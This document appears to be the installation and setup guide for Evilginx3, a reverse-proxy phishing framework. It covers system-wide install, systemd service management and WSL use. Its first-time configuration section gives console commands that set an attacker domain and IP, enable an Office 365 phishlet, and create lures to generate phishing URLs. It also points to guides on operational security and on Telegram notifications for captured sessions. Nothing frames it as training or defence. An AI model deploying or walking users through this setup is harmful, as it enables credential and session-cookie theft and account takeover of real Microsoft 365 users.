# Evilginx3 Installation Guide

## Quick Installation

The installer now installs Evilginx **system-wide** with automatic path detection.

### One-Command Installation

```bash
# Make executable (if needed)
chmod +x install.sh

# Run installer
sudo bash install.sh
```

## Installation Structure

After installation, Evilginx is installed system-wide:

```
/usr/local/bin/evilginx          # Main binary (wrapper script)
/opt/evilginx/                   # Installation base
├── phishlets/                   # Phishlet configurations
├── redirectors/                 # Turnstile redirectors
└── *.md                         # Documentation

~/.evilginx/                     # User configuration
├── config.json                  # Settings
├── data.db                      # Session database
└── crt/                         # SSL certificates

/var/log/evilginx/               # System logs
```

## Running Evilginx

### Simple Command (Recommended)

```bash
# Just run evilginx - it auto-loads everything!
sudo evilginx
```

That's it! The wrapper script automatically loads:
- Phishlets from `/opt/evilginx/phishlets`
- Redirectors from `/opt/evilginx/redirectors`
- Configuration from `~/.evilginx`

### With Custom Paths (Optional)

You can still override the defaults if needed:

```bash
# Custom phishlets directory
sudo evilginx -p /custom/path/phishlets

# Custom redirectors directory
sudo evilginx -t /custom/path/redirectors

# Custom config directory
sudo evilginx -c /custom/path/config

# Or all custom
sudo evilginx -p /custom/phishlets -t /custom/redirectors -c /custom/config
```

## Service Management (Linux VPS only)

On a real Linux VPS (not WSL), you also get systemd service:

```bash
# Start as background service
evilginx-start

# Stop service
evilginx-stop

# Restart service
evilginx-restart

# Check status
evilginx-status

# View logs
evilginx-logs
```

Or use systemd directly:

```bash
systemctl start evilginx
systemctl stop evilginx
systemctl status evilginx
journalctl -u evilginx -f
```

## WSL Installation

For WSL (Windows Subsystem for Linux):

```bash
# In PowerShell
wsl

# Navigate to Evilginx3
cd /mnt/c/Users/user/Desktop/git/Evilginx3

# Run installer
sudo bash install.sh

# After installation, just run:
sudo evilginx
```

**WSL Notes:**
- systemd not supported → No background service
- UFW firewall not supported → Configure Windows Firewall manually
- Fail2ban not supported → Not needed for local testing

## First-Time Configuration

After installation, run Evilginx:

```bash
sudo evilginx
```

In the Evilginx console:

```bash
# Set your domain
config domain yourdomain.com

# Set your public IP
config ipv4 external YOUR_PUBLIC_IP

# Enable automatic certificates
config autocert on

# Set lure generation strategy
config lure_strategy realistic

# Enable a phishlet
phishlets hostname o365 login.yourdomain.com
phishlets enable o365

# Create a lure
lures create o365
lures get-url 0
```

## Troubleshooting

### Command not found

```bash
# Make sure you're in the right directory
cd /path/to/Evilginx3

# Make executable
chmod +x install.sh

# Run with bash explicitly
sudo bash install.sh
```

### Permission errors

```bash
# Ensure you're running as root
sudo bash install.sh
```

### WSL: systemd errors

The installer detects WSL and automatically skips systemd/firewall configuration. This is normal.

## Uninstallation

```bash
# Run uninstaller
sudo bash uninstall.sh
```

The uninstaller will remove:
- `/usr/local/bin/evilginx`
- `/opt/evilginx/`
- `/var/log/evilginx/`
- `~/.evilginx/` (optional)
- Systemd service (if created)
- Firewall rules (optional)

## Key Features

✅ **System-wide installation** - `evilginx` command available everywhere
✅ **Auto-path detection** - No need to specify `-p` or `-t` flags
✅ **Absolute paths** - Phishlets and redirectors loaded automatically
✅ **Clean separation** - Binary, data, and config in standard locations
✅ **WSL compatible** - Detects and adapts to WSL environment
✅ **Service support** - systemd service on real Linux systems

## Documentation

- **README.md** - Project overview and features
- **DEPLOYMENT_GUIDE.md** - Complete deployment guide
- **BEST_PRACTICES.md** - Operational security best practices
- **NEW_PHISHLETS_GUIDE.md** - How to create custom phishlets
- **TELEGRAM_NOTIFICATIONS.md** - Setting up Telegram notifications
